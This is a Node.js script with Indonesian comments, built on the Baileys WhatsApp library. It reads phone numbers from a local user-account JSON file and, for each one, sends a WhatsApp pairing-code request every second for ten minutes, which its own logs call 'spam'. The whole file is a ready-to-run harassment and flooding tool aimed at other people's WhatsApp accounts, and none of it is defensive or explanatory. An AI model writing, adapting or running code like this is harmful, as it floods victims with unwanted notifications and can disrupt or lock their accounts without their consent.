const { makeWASocket, Browsers, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");

async function spam(nomor) {
  try {
    const { state } = await useMultiFileAuthState("p");

    const client = makeWASocket({
      printQRInTerminal: false,
      browser: Browsers.baileys("macOS"),
      auth: state,
      logger: pino({ level: "fatal" }),
    });

    console.log(`Memulai proses untuk nomor ${nomor}`);

    const intervalId = setInterval(async () => {
      try {
        await client.requestPairingCode(nomor); // Kirim request pairing tanpa key
        console.log(`[ BERHASIL ] Pairing request sent to ${nomor}`);
      } catch (err) {
        console.error(`[ ERROR ] Gagal mengirim pairing request ke ${nomor}`);
      }
    }, 1000); // Interval 1 detik

    // Hentikan proses setelah 10 menit
    setTimeout(() => {
      clearInterval(intervalId);
      console.log(`[INFO] Spam selesai untuk nomor ${nomor}`);
    }, 10 * 60 * 1000);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan pada nomor ${nomor}:`, err.message);
  }
}

// Membaca data dari file JSON
fs.readFile('./database/user-account.json', 'utf8', (err, data) => {
  if (err) {
    console.error("Gagal membaca file:", err);
    return;
  }

  try {
    // Parse JSON dan ambil daftar user
    const jsonData = JSON.parse(data);

    // Iterasi melalui setiap user di dalam JSON
    for (let user in jsonData) {
      const userData = jsonData[user];

      // Pastikan user memiliki field "numbers" yang berisi array
      if (userData.numbers && Array.isArray(userData.numbers)) {
        // Menjalankan fungsi spam untuk setiap nomor dalam array 'numbers' user
        userData.numbers.forEach((nomor) => {
          spam(nomor);
        });
      } else {
        console.log(`[INFO] Tidak ada nomor untuk user ${user}`);
      }
    }
  } catch (err) {
    console.error("Error parsing JSON:", err);
  }
});
